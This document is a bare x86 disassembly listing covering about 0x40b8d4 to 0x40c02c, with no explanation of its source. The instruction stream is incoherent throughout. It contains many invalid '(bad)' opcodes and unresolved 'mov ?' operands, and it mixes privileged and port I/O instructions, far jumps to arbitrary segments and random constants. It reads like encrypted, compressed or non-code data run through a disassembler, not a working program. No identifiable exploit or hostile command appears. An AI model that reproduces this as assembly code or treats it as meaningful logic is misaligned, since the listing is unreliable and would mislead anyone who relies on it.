  40b8d4:	cmp    eax,0x1b36f9a6
  40b8d9:	adc    esp,ecx
  40b8db:	dec    ebp
  40b8dc:	iret   
  40b8dd:	and    ebp,0xffffffd6
  40b8e0:	push   ebp
  40b8e1:	pop    ss
  40b8e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8e3:	jns    0x40b957
  40b8e5:	ffree  st(4)
  40b8e7:	mov    ah,0x50
  40b8e9:	cmp    ah,BYTE PTR [eax]
  40b8eb:	push   ecx
  40b8ec:	xor    eax,0x3d6ee92f
  40b8f1:	fst    DWORD PTR [esi]
  40b8f3:	inc    edi
  40b8f4:	push   ebp
  40b8f5:	push   ds
  40b8f6:	push   0xffffffe1
  40b8f8:	scas   eax,DWORD PTR es:[edi]
  40b8f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8fa:	sub    al,BYTE PTR [ecx+0x3169fa66]
  40b900:	push   DWORD PTR [ebx+esi*2+0x33526d21]
  40b907:	mov    edx,0x4fe2e29b
  40b90c:	sub    eax,0x723a0d3c
  40b911:	cmp    bl,BYTE PTR [ecx+0x13c6b73b]
  40b917:	out    0xde,al
  40b919:	jg     0x40b89d
  40b91b:	sub    BYTE PTR [eax+0x47d9d3cb],dh
  40b921:	push   ecx
  40b922:	mov    dh,0xfa
  40b924:	scas   eax,DWORD PTR es:[di]
  40b926:	mov    esp,0x46aac4d9
  40b92b:	adc    eax,0xae62fda4
  40b930:	cmp    eax,0x1a9aba2c
  40b935:	fisttp DWORD PTR [ecx-0x1e]
  40b938:	popf   
  40b939:	jl     0x40b93f
  40b93b:	js     0x40b947
  40b93d:	pop    ecx
  40b93e:	sbb    ah,BYTE PTR [ebp+edx*2+0x15]
  40b942:	mov    al,0x1
  40b944:	sub    al,0x51
  40b946:	ins    BYTE PTR es:[edi],dx
  40b947:	into   
  40b948:	mov    ds:0x8ad8bbf9,al
  40b94d:	add    DWORD PTR [ebp-0x27],edx
  40b950:	mov    al,ds:0x7213f42a
  40b955:	mov    ecx,0xde51604e
  40b95a:	test   al,0xd6
  40b95c:	mov    al,ds:0x99205d92
  40b961:	rcr    DWORD PTR [ebx-0x65ec2e39],0x29
  40b968:	inc    esp
  40b969:	mov    edx,0xa974b9cb
  40b96e:	jae    0x40b96d
  40b970:	push   esp
  40b971:	test   al,0xa2
  40b973:	icebp  
  40b974:	test   BYTE PTR [edi-0x2fdf05da],ch
  40b97a:	mov    ds:0x1349f40,eax
  40b97f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b980:	jl     0x40b921
  40b982:	add    ch,bh
  40b984:	xchg   sp,ax
  40b987:	fs xor eax,0xaa78929f
  40b98d:	shr    DWORD PTR [ebx],1
  40b98f:	xlat   BYTE PTR ds:[ebx]
  40b990:	cld    
  40b991:	push   0xffffffaa
  40b993:	cmp    al,0x6c
  40b995:	mov    ds:0x7019cf0c,al
  40b99a:	cmp    BYTE PTR [eax-0x50a440f5],cl
  40b9a0:	ret    0xf593
  40b9a3:	stos   BYTE PTR es:[edi],al
  40b9a4:	xchg   esp,eax
  40b9a5:	fcomi  st,st(1)
  40b9a7:	pop    edx
  40b9a8:	or     al,0xe2
  40b9aa:	imul   esi,DWORD PTR [ebx],0xbc45687a
  40b9b0:	xchg   cl,ah
  40b9b2:	std    
  40b9b3:	fisubr DWORD PTR [edi]
  40b9b5:	aaa    
  40b9b6:	cs pusha 
  40b9b8:	cmp    al,0x3c
  40b9ba:	(bad)  
  40b9bc:	pop    esi
  40b9bd:	adc    dl,BYTE PTR [edi]
  40b9bf:	cmp    BYTE PTR gs:[ebx-0xb],bh
  40b9c3:	out    dx,al
  40b9c4:	mov    edx,0xa746bfa7
  40b9c9:	cld    
  40b9ca:	and    al,0xf5
  40b9cc:	cmp    eax,DWORD PTR [ebp+0x37f12359]
  40b9d2:	sub    esp,ecx
  40b9d4:	pop    ecx
  40b9d5:	dec    esp
  40b9d6:	push   esp
  40b9d7:	mov    ?,edx
  40b9d9:	adc    BYTE PTR [esi-0x37bf444d],ch
  40b9df:	pop    es
  40b9e0:	jp     0x40b9d3
  40b9e2:	jg     0x40ba53
  40b9e4:	dec    ebx
  40b9e5:	out    dx,al
  40b9e6:	into   
  40b9e7:	dec    eax
  40b9e8:	adc    DWORD PTR [ecx+0x36390237],edx
  40b9ee:	add    eax,0x9fcd5c41
  40b9f3:	jae    0x40ba34
  40b9f5:	xor    DWORD PTR [eax-0xc],ebx
  40b9f8:	imul   BYTE PTR [ecx+0x4f]
  40b9fb:	aam    0xcb
  40b9fd:	ficom  DWORD PTR [edx-0xc]
  40ba00:	neg    dl
  40ba02:	fdivr  QWORD PTR [ebx]
  40ba04:	data16 cli 
  40ba06:	shl    DWORD PTR [ebx-0x1f],0x4b
  40ba0a:	jbe    0x40ba66
  40ba0c:	pop    ds
  40ba0d:	(bad)  
  40ba0e:	fidivr WORD PTR [ecx-0x2e0ef211]
  40ba14:	add    DWORD PTR ss:[eax],edi
  40ba17:	add    BYTE PTR [ebx],bl
  40ba19:	xlat   BYTE PTR ds:[ebx]
  40ba1a:	jmp    0xae1b:0xb23fa696
  40ba21:	or     edi,DWORD PTR ds:0x663d396e
  40ba27:	pop    esi
  40ba28:	inc    BYTE PTR [eax]
  40ba2a:	shl    DWORD PTR [ebp+0x1e],cl
  40ba2d:	inc    esi
  40ba2e:	xchg   ebx,eax
  40ba2f:	cs aam 0x73
  40ba32:	xchg   ecx,eax
  40ba33:	dec    esi
  40ba34:	les    esp,FWORD PTR [eax-0x2a70c10d]
  40ba3a:	lahf   
  40ba3b:	and    al,0x76
  40ba3d:	push   0xffffffdd
  40ba3f:	sub    eax,0xdd9c16a3
  40ba44:	cmp    esp,DWORD PTR [esi+0x78691703]
  40ba4a:	add    edx,edi
  40ba4c:	xor    al,0x5a
  40ba4e:	dec    esp
  40ba4f:	(bad)  
  40ba50:	mov    esi,0xbf17fce8
  40ba55:	ins    DWORD PTR es:[edi],dx
  40ba56:	push   ecx
  40ba57:	mov    ah,0xe4
  40ba59:	xchg   BYTE PTR [esi],bl
  40ba5b:	jb     0x40ba35
  40ba5d:	(bad)  
  40ba5e:	aas    
  40ba5f:	ret    
  40ba60:	test   al,0xaa
  40ba63:	dec    esp
  40ba64:	add    dh,BYTE PTR es:[ecx+0x14]
  40ba68:	popa   
  40ba69:	scas   eax,DWORD PTR es:[edi]
  40ba6a:	je     0x40bae3
  40ba6c:	sbb    BYTE PTR [ebx+0x3c],al
  40ba6f:	dec    ecx
  40ba70:	push   cs
  40ba71:	out    0xf7,eax
  40ba73:	pop    ss
  40ba74:	pushf  
  40ba75:	stos   DWORD PTR es:[edi],eax
  40ba76:	sbb    eax,esi
  40ba78:	push   0xffffffb7
  40ba7a:	push   esp
  40ba7b:	mov    edx,0xd17c09c5
  40ba80:	xchg   BYTE PTR [ebp+0x20],al
  40ba83:	cmp    ch,BYTE PTR [ebp-0x62ee5f10]
  40ba89:	aad    0xe1
  40ba8b:	jne    0x40ba13
  40ba8d:	cdq    
  40ba8e:	push   ss
  40ba8f:	adc    eax,0xe983ae9f
  40ba94:	ins    DWORD PTR es:[edi],dx
  40ba95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba96:	ror    DWORD PTR [edx],cl
  40ba98:	pop    ebx
  40ba99:	icebp  
  40ba9a:	div    BYTE PTR ds:0x1210d67f
  40baa0:	popa   
  40baa1:	add    DWORD PTR [eax+0x77689342],0xce0e17bf
  40baab:	xlat   BYTE PTR ds:[ebx]
  40baac:	cld    
  40baad:	add    DWORD PTR [edi-0x21],esp
  40bab0:	cmp    al,BYTE PTR [ecx-0x3f]
  40bab3:	push   ss
  40bab4:	mov    bl,0xc8
  40bab6:	pop    ebx
  40bab7:	(bad)  
  40bab8:	and    eax,0x8e2a5aee
  40babd:	jo     0x40bae0
  40babf:	ret    0x4259
  40bac2:	mov    al,0x5c
  40bac4:	cmc    
  40bac5:	mov    eax,ds:0xb0851bf7
  40baca:	mov    esi,0x80260185
  40bacf:	cmp    dh,BYTE PTR [ebp-0x27]
  40bad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bad3:	fsubr  DWORD PTR [edi]
  40bad5:	sahf   
  40bad6:	in     eax,0x97
  40bad8:	sbb    esi,DWORD PTR [edx-0x21]
  40badb:	inc    edx
  40badc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40badd:	mov    DWORD PTR [edx+0x58],esi
  40bae0:	pop    es
  40bae1:	repnz das 
  40bae3:	inc    edi
  40bae4:	jmp    0x40bb1f
  40bae6:	fisubr DWORD PTR [edx+0x3d]
  40bae9:	xchg   DWORD PTR [ebx-0x7a],esp
  40baec:	pop    ebp
  40baed:	mov    ah,0x7a
  40baef:	loope  0x40bb42
  40baf1:	in     al,0x6c
  40baf3:	pusha  
  40baf4:	add    al,0x4d
  40baf6:	inc    edi
  40baf7:	push   ss
  40baf8:	mov    ebx,0x75d793ca
  40bafd:	cmp    edi,DWORD PTR [esi+0x2c]
  40bb00:	outs   dx,BYTE PTR ds:[esi]
  40bb01:	imul   esp,DWORD PTR [esi+0xd],0xc0f990cc
  40bb08:	hlt    
  40bb09:	jo     0x40bb81
  40bb0b:	pop    edx
  40bb0c:	cmp    ah,BYTE PTR [esi]
  40bb0e:	jecxz  0x40bb70
  40bb10:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40bb12:	test   eax,0x2fb702bf
  40bb17:	add    al,0x49
  40bb19:	loop   0x40bb8f
  40bb1b:	icebp  
  40bb1c:	gs mov esi,0x74a58d03
  40bb22:	push   es
  40bb23:	aad    0x5f
  40bb25:	mov    dh,0x1
  40bb27:	(bad)  
  40bb28:	sub    eax,0x7b4b83e1
  40bb2d:	retf   
  40bb2e:	jle    0x40bb53
  40bb30:	push   ss
  40bb31:	cwde   
  40bb32:	xchg   ecx,eax
  40bb33:	loopne 0x40bb4f
  40bb35:	out    0xd,al
  40bb37:	test   BYTE PTR [ebp-0x5ee43a41],ch
  40bb3d:	adc    BYTE PTR [edx],0x69
  40bb40:	jnp    0x40bb06
  40bb42:	xchg   esi,eax
  40bb43:	scas   eax,DWORD PTR es:[edi]
  40bb44:	ror    DWORD PTR [ebp+0x3f],cl
  40bb47:	mov    esp,DWORD PTR [edi]
  40bb49:	repz xlat BYTE PTR ds:[ebx]
  40bb4b:	add    DWORD PTR [ebp-0x6c],edi
  40bb4e:	mov    al,ds:0x11a834e5
  40bb53:	neg    BYTE PTR [eax-0x20]
  40bb56:	xchg   BYTE PTR [ecx-0x77],cl
  40bb59:	cmp    eax,0x3652d766
  40bb5e:	pop    edx
  40bb5f:	or     ebp,0xaa039f2f
  40bb65:	pop    ecx
  40bb66:	inc    ecx
  40bb67:	and    ecx,DWORD PTR [edi+0x1b]
  40bb6a:	(bad)  
  40bb6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb6d:	push   ecx
  40bb6e:	xor    DWORD PTR [ebp+0x61],esi
  40bb71:	stos   BYTE PTR es:[edi],al
  40bb72:	push   ds
  40bb73:	cmc    
  40bb74:	dec    ebp
  40bb75:	inc    ecx
  40bb76:	enter  0x7979,0xa8
  40bb7a:	xchg   ebp,eax
  40bb7b:	lods   eax,DWORD PTR ds:[esi]
  40bb7c:	push   ecx
  40bb7d:	int    0x97
  40bb7f:	inc    edi
  40bb80:	mov    ebp,0x5c2b4f30
  40bb85:	and    bh,0x43
  40bb88:	pop    eax
  40bb89:	ja     0x40bb70
  40bb8b:	lds    eax,FWORD PTR [edx-0x2de25361]
  40bb91:	pusha  
  40bb92:	test   ebp,eax
  40bb94:	or     al,0xea
  40bb96:	mov    esi,0xd635cbf8
  40bb9b:	sub    DWORD PTR [ebx+0x26],0x31ed7e6e
  40bba2:	arpl   WORD PTR [edi-0x54],dx
  40bba5:	cs mov dh,0xde
  40bba8:	sub    al,0x28
  40bbaa:	add    eax,0x8a38091d
  40bbaf:	cwde   
  40bbb0:	adc    esi,eax
  40bbb2:	(bad)  
  40bbb3:	sbb    bh,ch
  40bbb5:	retf   
  40bbb6:	and    eax,0x8763565f
  40bbbb:	cmp    DWORD PTR [ebp-0xd37e2ee],esp
  40bbc1:	jg     0x40bbe8
  40bbc3:	push   eax
  40bbc4:	fcomp  DWORD PTR [ebx+0x47f25b7e]
  40bbca:	pop    ecx
  40bbcb:	icebp  
  40bbcc:	or     eax,ebx
  40bbce:	repnz lods eax,DWORD PTR ds:[esi]
  40bbd0:	ins    BYTE PTR es:[edi],dx
  40bbd1:	or     al,0xa0
  40bbd3:	sbb    al,BYTE PTR [esi+0x21c7959f]
  40bbd9:	shr    DWORD PTR [ecx+eax*1],0x89
  40bbdd:	out    0x38,al
  40bbdf:	dec    DWORD PTR [esi+0x1b0dee95]
  40bbe5:	xchg   DWORD PTR [eax+0x36102238],esi
  40bbeb:	ds add edx,ebx
  40bbee:	daa    
  40bbef:	retf   0x7cca
  40bbf2:	mov    edx,0x6a67ae02
  40bbf7:	xchg   ecx,eax
  40bbf8:	lods   al,BYTE PTR ds:[esi]
  40bbf9:	or     edi,DWORD PTR [ecx]
  40bbfb:	dec    eax
  40bbfc:	ins    DWORD PTR es:[edi],dx
  40bbfd:	into   
  40bbfe:	jbe    0x40bbfa
  40bc00:	mov    eax,ds:0xdaa0e783
  40bc05:	cmp    eax,0x47acb0b8
  40bc0a:	mov    al,ds:0xc1fd8630
  40bc0f:	and    al,0x53
  40bc11:	imul   edx,eax,0x7d
  40bc14:	dec    eax
  40bc15:	outs   dx,BYTE PTR ds:[esi]
  40bc16:	push   eax
  40bc17:	xchg   ecx,eax
  40bc18:	jge    0x40bc7e
  40bc1a:	xchg   DWORD PTR [ebx-0x58ae6e67],esi
  40bc20:	iret   
  40bc21:	int3   
  40bc22:	mov    eax,ds:0xae3008a0
  40bc27:	loopne 0x40bc7b
  40bc29:	mov    ebx,0x7f2f2ac9
  40bc2e:	and    esp,DWORD PTR [esi-0x6a]
  40bc31:	or     eax,0x1d6fb3f8
  40bc36:	mov    ds:0xe7d75540,al
  40bc3b:	adc    cl,0x3c
  40bc3e:	or     eax,0xe4816fff
  40bc43:	bnd jmp 0x40bc98
  40bc46:	stos   DWORD PTR es:[edi],eax
  40bc47:	loop   0x40bc21
  40bc49:	iret   
  40bc4a:	(bad)  
  40bc4b:	mov    ebx,0xef8e9959
  40bc50:	(bad)  
  40bc51:	rcr    dh,cl
  40bc53:	adc    al,0x1e
  40bc55:	jmp    0x40bc02
  40bc57:	out    dx,al
  40bc58:	add    BYTE PTR [esi-0x34],dh
  40bc5b:	and    eax,0x1a68be3d
  40bc60:	pop    es
  40bc61:	push   ebx
  40bc62:	addr16 sbb dl,dh
  40bc65:	sti    
  40bc66:	push   ebx
  40bc67:	mov    edx,DWORD PTR [ebx]
  40bc69:	sub    al,0x7b
  40bc6b:	push   esp
  40bc6c:	in     eax,dx
  40bc6d:	hlt    
  40bc6e:	xor    eax,0x691aad45
  40bc73:	sbb    bl,BYTE PTR ds:0x3b5d75e9
  40bc79:	cdq    
  40bc7a:	mov    ?,WORD PTR [esi-0x4de57fd5]
  40bc80:	stc    
  40bc81:	mov    bh,0x85
  40bc83:	popa   
  40bc84:	mov    ds:0x4c3e817a,eax
  40bc89:	sbb    dl,BYTE PTR ds:0x40030820
  40bc8f:	ficomp WORD PTR [edi+esi*2]
  40bc92:	jge    0x40bc7b
  40bc94:	and    dh,BYTE PTR [ebp-0x75]
  40bc97:	adc    cl,BYTE PTR [edx+0x5d]
  40bc9a:	dec    esp
  40bc9b:	je     0x40bcf7
  40bc9d:	and    DWORD PTR [eax],eax
  40bc9f:	and    DWORD PTR [eax-0x5c55566c],ebx
  40bca5:	jecxz  0x40bd12
  40bca7:	iret   
  40bca8:	into   
  40bca9:	adc    BYTE PTR [ebx],al
  40bcab:	jns    0x40bcb8
  40bcad:	pop    edx
  40bcae:	mov    cl,0xd7
  40bcb0:	dec    eax
  40bcb1:	inc    edi
  40bcb2:	push   edi
  40bcb3:	cwde   
  40bcb4:	and    BYTE PTR [ecx],cl
  40bcb6:	in     al,dx
  40bcb7:	icebp  
  40bcb8:	cwde   
  40bcb9:	push   edx
  40bcba:	loope  0x40bcae
  40bcbc:	sub    BYTE PTR [edi-0x31e5028c],bh
  40bcc2:	xor    esi,DWORD PTR [edi]
  40bcc4:	add    dl,BYTE PTR [eax]
  40bcc6:	mov    ecx,0xf3628ef
  40bccb:	push   ss
  40bccc:	in     al,dx
  40bccd:	(bad)  
  40bcce:	jne    0x40bcdd
  40bcd0:	loopne 0x40bd0c
  40bcd2:	dec    esp
  40bcd3:	adc    al,0x14
  40bcd5:	ror    DWORD PTR [edx+0x65e245a1],cl
  40bcdb:	call   0x19d9:0x79cf04ea
  40bce2:	and    BYTE PTR [ecx+0x5d4d9c95],ah
  40bce8:	pop    ds
  40bce9:	pop    ecx
  40bcea:	adc    BYTE PTR ds:0xb6bfc40f,al
  40bcf0:	sbb    al,0x1e
  40bcf2:	jle    0x40bcef
  40bcf4:	jnp    0x40bcb8
  40bcf6:	(bad)  [eax*4+0x692bb774]
  40bcfd:	ja     0x40bd72
  40bcff:	loope  0x40bcc0
  40bd01:	jns    0x40bcf1
  40bd03:	lds    edi,FWORD PTR [edx+eiz*2]
  40bd06:	addr16 cmp esi,ecx
  40bd09:	inc    ebp
  40bd0a:	add    al,0x4c
  40bd0c:	and    esi,DWORD PTR [edx+0x5bbfe69]
  40bd12:	aam    0x5b
  40bd14:	out    0xeb,eax
  40bd16:	call   0xdd66cf1b
  40bd1b:	repnz push cs
  40bd1d:	stos   BYTE PTR es:[edi],al
  40bd1e:	push   0xb
  40bd20:	xor    ebp,DWORD PTR [edi]
  40bd22:	fst    st(6)
  40bd24:	xor    cl,cl
  40bd26:	leave  
  40bd27:	daa    
  40bd28:	add    esp,DWORD PTR [eax-0x2]
  40bd2b:	push   esi
  40bd2c:	jecxz  0x40bcc4
  40bd2e:	das    
  40bd2f:	lods   al,BYTE PTR ds:[esi]
  40bd30:	push   ds
  40bd31:	and    DWORD PTR [edi+0x77],0x94dfb76
  40bd38:	cld    
  40bd39:	repnz or eax,DWORD PTR [edi+0x4c69ad16]
  40bd40:	dec    DWORD PTR [ebp-0x49]
  40bd43:	mov    eax,ds:0x4ab53f5b
  40bd48:	rcl    DWORD PTR ds:0x608d3020,1
  40bd4e:	aad    0xe4
  40bd50:	dec    ebp
  40bd51:	sbb    ah,ah
  40bd53:	sbb    ecx,0xb7965557
  40bd59:	ror    al,cl
  40bd5b:	adc    BYTE PTR [ecx-0x61],0x2a
  40bd5f:	cmp    eax,0xb85129f
  40bd64:	or     al,0xeb
  40bd66:	mov    bl,0xfb
  40bd68:	cmp    dh,cl
  40bd6a:	jp     0x40bdaa
  40bd6c:	pusha  
  40bd6d:	mov    esp,0xaa54f0d8
  40bd72:	dec    eax
  40bd73:	mov    al,ds:0xbf4bf4c3
  40bd78:	pop    esi
  40bd79:	loopne 0x40bd2c
  40bd7b:	sbb    eax,0x47b58a5a
  40bd80:	jnp    0x40bd8a
  40bd82:	add    BYTE PTR [esi-0x6e],cl
  40bd85:	mov    ds:0x2a9a1b58,eax
  40bd8a:	cwde   
  40bd8b:	sbb    eax,0xe9c76eb1
  40bd90:	mov    eax,0xd5be2a4a
  40bd95:	jmp    0xec1e:0x33316eb8
  40bd9c:	and    ebp,DWORD PTR [edx]
  40bd9e:	xlat   BYTE PTR ds:[ebx]
  40bd9f:	sub    edx,DWORD PTR [eax]
  40bda1:	shl    DWORD PTR [edi-0x7c],cl
  40bda4:	mov    al,0xc1
  40bda6:	mov    al,0x82
  40bda8:	bound  edi,QWORD PTR [esi-0x14]
  40bdab:	(bad)  
  40bdac:	xlat   BYTE PTR ds:[ebx]
  40bdad:	mov    dh,0x6f
  40bdaf:	lahf   
  40bdb0:	or     BYTE PTR [esi],0xd0
  40bdb3:	ror    BYTE PTR ds:0xd9568f87,0x3c
  40bdba:	and    ah,BYTE PTR [edx]
  40bdbc:	aam    0x19
  40bdbe:	pop    ebx
  40bdbf:	pop    edi
  40bdc0:	add    eax,0x15f90877
  40bdc5:	fcom   QWORD PTR [esi+edx*4-0x29]
  40bdc9:	pusha  
  40bdca:	dec    edi
  40bdcb:	push   cs
  40bdcc:	mov    cl,0x7a
  40bdce:	mov    bh,BYTE PTR [eax]
  40bdd0:	xor    ah,BYTE PTR [ebx+0x257486de]
  40bdd6:	mov    al,BYTE PTR [edx+ecx*8+0x21]
  40bdda:	push   edx
  40bddb:	xor    al,BYTE PTR [ecx]
  40bddd:	jge    0x40be50
  40bddf:	add    eax,eax
  40bde1:	mov    BYTE PTR [edi-0x12],ch
  40bde4:	mov    dl,0x5a
  40bde6:	cld    
  40bde7:	into   
  40bde8:	int3   
  40bde9:	adc    BYTE PTR [edi+0x43c62718],ah
  40bdef:	cmp    dh,BYTE PTR [ebx+0x7390789a]
  40bdf5:	push   ebx
  40bdf6:	sub    eax,0xbeffdd93
  40bdfb:	xor    eax,0x3170a451
  40be00:	shl    DWORD PTR gs:[ebp-0x2a368574],0x82
  40be08:	and    eax,DWORD PTR [edi+0x32915779]
  40be0e:	ficomp WORD PTR [eax-0x7604ff17]
  40be14:	popf   
  40be15:	idiv   DWORD PTR [esi-0x6d]
  40be18:	ins    DWORD PTR es:[edi],dx
  40be19:	xchg   BYTE PTR [esi+0x63],bl
  40be1c:	inc    ebp
  40be1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be1e:	sbb    BYTE PTR [esi-0x6c1344da],bl
  40be24:	and    dl,BYTE PTR [ebx+0x6b]
  40be27:	xor    ecx,esi
  40be29:	jns    0x40bea7
  40be2b:	sub    eax,0xeb783da7
  40be30:	aaa    
  40be31:	(bad)  
  40be32:	sbb    eax,0xcfcbd6b0
  40be37:	clc    
  40be38:	xchg   esi,eax
  40be39:	call   0x7456:0x67cb2b1c
  40be40:	xchg   ah,ch
  40be42:	inc    esi
  40be43:	lahf   
  40be44:	mov    DWORD PTR [ecx+0x10af0302],eax
  40be4a:	rcl    BYTE PTR [eax],1
  40be4c:	xchg   esp,eax
  40be4d:	movlps QWORD PTR ds:0xd80c72ae,xmm0
  40be54:	loope  0x40be00
  40be56:	sbb    edx,0xffffff97
  40be59:	stos   BYTE PTR es:[edi],al
  40be5a:	adc    al,0x33
  40be5c:	dec    esp
  40be5d:	(bad)  
  40be5e:	adc    dl,BYTE PTR ds:0xfb732e66
  40be64:	jns    0x40be59
  40be66:	push   ebx
  40be67:	call   0xe11e:0x986483cd
  40be6e:	jmp    0x40beb8
  40be70:	loop   0x40beee
  40be72:	mov    ?,WORD PTR [ebx+0x78]
  40be75:	sub    eax,eax
  40be77:	add    BYTE PTR [eax-0x34a6cbba],ch
  40be7d:	aas    
  40be7e:	test   eax,0x2bfef8f4
  40be83:	int3   
  40be84:	add    bh,dl
  40be86:	in     al,dx
  40be87:	xor    BYTE PTR [ecx],bl
  40be89:	cmp    bl,BYTE PTR [ecx+0x62]
  40be8c:	into   
  40be8d:	repz xchg edx,eax
  40be8f:	inc    ebp
  40be90:	jns    0x40bef2
  40be92:	retf   0xaebf
  40be95:	sub    eax,0xfb6ad42f
  40be9a:	mov    edi,0x80f32f7c
  40be9f:	jbe    0x40beb4
  40bea1:	dec    ebx
  40bea2:	repz mov ch,0x33
  40bea5:	dec    esp
  40bea6:	inc    edi
  40bea7:	ins    DWORD PTR es:[edi],dx
  40bea8:	loop   0x40bf23
  40beaa:	or     DWORD PTR [edx-0x77d80647],0x6c8ffc54
  40beb4:	adc    al,0x20
  40beb6:	sub    ebx,DWORD PTR [ebx+0x11]
  40beb9:	fbstp  TBYTE PTR [edx+0x7e3f815c]
  40bebf:	inc    ebp
  40bec0:	adc    BYTE PTR [eax+0x3dbc1a75],ch
  40bec6:	mov    esp,DWORD PTR [edi+0x74]
  40bec9:	in     eax,0xff
  40becb:	adc    BYTE PTR [esi+0xa2c63df],cl
  40bed1:	sbb    edx,DWORD PTR [edi]
  40bed3:	in     eax,0xc2
  40bed5:	pop    es
  40bed6:	mov    ebp,0x9e75a9e6
  40bedb:	mov    ah,0x9d
  40bedd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bede:	cmp    DWORD PTR [eax-0x126474d2],0x28594bd2
  40bee8:	addr16 dec edi
  40beea:	fsubr  DWORD PTR [eax+ecx*1-0x3ca62f87]
  40bef1:	xor    cl,ch
  40bef3:	stos   DWORD PTR es:[edi],eax
  40bef4:	inc    eax
  40bef6:	lods   al,BYTE PTR ds:[esi]
  40bef7:	dec    ebp
  40bef8:	mov    ecx,0xaaee01b6
  40befd:	mov    al,0xa7
  40beff:	cdq    
  40bf00:	rcl    ebx,cl
  40bf02:	mov    bh,0x5f
  40bf04:	mov    bl,0x18
  40bf06:	nop
  40bf07:	arpl   WORD PTR [ecx],ax
  40bf09:	push   ecx
  40bf0a:	in     eax,0x5a
  40bf0c:	(bad)  
  40bf0d:	call   0x29a6:0xd0b4733b
  40bf14:	lods   eax,DWORD PTR ds:[esi]
  40bf15:	add    BYTE PTR [ebx+ebp*4],cl
  40bf18:	mov    WORD PTR [edi+0x4f112533],gs
  40bf1e:	rcl    DWORD PTR [ebx-0x37fb17bb],cl
  40bf24:	pop    edi
  40bf25:	push   edi
  40bf26:	shr    ebp,0xd3
  40bf29:	mov    eax,ds:0x9f4332
  40bf2e:	aas    
  40bf2f:	and    esi,DWORD PTR [esp+ebx*1]
  40bf32:	int3   
  40bf33:	cmc    
  40bf34:	xchg   BYTE PTR [eax-0x46b914e],dh
  40bf3a:	cmp    edx,DWORD PTR [ecx-0x6a]
  40bf3d:	mov    eax,0x1fcd6a
  40bf42:	daa    
  40bf43:	stc    
  40bf44:	push   esi
  40bf45:	out    0xc9,eax
  40bf47:	lods   eax,DWORD PTR ds:[esi]
  40bf48:	mov    esi,0x7a55035e
  40bf4d:	jecxz  0x40bf29
  40bf4f:	imul   esi,DWORD PTR [esi-0x8],0xffffffbf
  40bf53:	sbb    DWORD PTR [eax],0x43
  40bf56:	fsub   DWORD PTR [ecx+0x38540bb2]
  40bf5c:	inc    ebx
  40bf5d:	pusha  
  40bf5e:	pop    esi
  40bf5f:	cmp    bl,BYTE PTR [edx+esi*8-0x7feb8742]
  40bf66:	push   ds
  40bf67:	mov    edx,0xde7d0af0
  40bf6c:	xor    ebp,DWORD PTR [esi-0x80]
  40bf6f:	push   es
  40bf70:	push   es
  40bf71:	cmp    BYTE PTR [eax+ebx*4-0x44],al
  40bf75:	jne    0x40bf6d
  40bf77:	push   es
  40bf78:	cmp    eax,0x49d62c9a
  40bf7d:	mov    ds:0x3145e717,al
  40bf82:	xchg   DWORD PTR [edx-0x7c72dabf],ebp
  40bf88:	cvtpi2ps xmm0,QWORD PTR ds:0x61bd1ad6
  40bf8f:	test   al,0x7a
  40bf91:	inc    esi
  40bf92:	and    BYTE PTR [edx-0x34],bh
  40bf95:	pop    ebx
  40bf96:	or     al,0x2f
  40bf98:	pop    ss
  40bf99:	test   al,0xd6
  40bf9b:	pop    ss
  40bf9c:	and    BYTE PTR [ebp-0x26],0xab
  40bfa0:	push   ss
  40bfa1:	pop    ds
  40bfa2:	fxam   
  40bfa4:	jl     0x40bfc3
  40bfa6:	pop    ebp
  40bfa7:	ss ins DWORD PTR es:[edi],dx
  40bfa9:	sbb    ecx,DWORD PTR [ecx-0x3]
  40bfac:	inc    ebp
  40bfad:	push   eax
  40bfae:	mov    ?,WORD PTR [edx]
  40bfb0:	out    0xe8,eax
  40bfb2:	or     ebp,ecx
  40bfb4:	add    cl,BYTE PTR [edx+ebp*8]
  40bfb7:	xor    DWORD PTR [edx-0x34],eax
  40bfba:	sbb    esp,DWORD PTR [ebp+eax*4-0x5d]
  40bfbe:	dec    esp
  40bfbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfc0:	loop   0x40bf4b
  40bfc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfc3:	sahf   
  40bfc4:	adc    eax,0xff16f0d
  40bfc9:	push   esi
  40bfca:	jmp    0xf1855d1e
  40bfcf:	fisttp QWORD PTR [edx]
  40bfd1:	pop    ebp
  40bfd2:	aas    
  40bfd3:	push   cs
  40bfd4:	hlt    
  40bfd5:	jne    0x40bfd6
  40bfd7:	retf   
  40bfd8:	xchg   edi,eax
  40bfd9:	dec    esi
  40bfda:	push   es
  40bfdb:	or     ax,0x78cf
  40bfdf:	sbb    DWORD PTR [eax-0x7835bb83],0xffffff94
  40bfe6:	les    esi,FWORD PTR ss:[ecx+0x1]
  40bfea:	xor    bh,BYTE PTR [ecx-0x53]
  40bfed:	push   ebx
  40bfee:	rol    DWORD PTR [ecx-0x7d9a8861],cl
  40bff4:	in     eax,dx
  40bff5:	mov    bl,0xd6
  40bff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bff8:	jp     0x40c02b
  40bffa:	xor    BYTE PTR [esi-0x6b599c9],dl
  40c000:	sub    ebx,ebp
  40c002:	pop    ebx
  40c003:	jbe    0x40bf93
  40c005:	stos   DWORD PTR es:[edi],eax
  40c006:	inc    ebp
  40c007:	sub    DWORD PTR [eax+edx*4-0x7ca82b79],edx
  40c00e:	icebp  
  40c00f:	ror    DWORD PTR [ecx],0x2c
  40c012:	div    DWORD PTR [edi-0x3a]
  40c015:	or     eax,0xf255336e
  40c01a:	in     eax,dx
  40c01b:	(bad)  
  40c01c:	push   ebp
  40c01d:	pop    edx
  40c01e:	xchg   edi,eax
  40c01f:	or     al,BYTE PTR [ebp-0x4cb17744]
  40c025:	int3   
  40c026:	inc    edi
  40c027:	mov    ecx,0x2c2c821f
  40c02c:	out    dx,eax
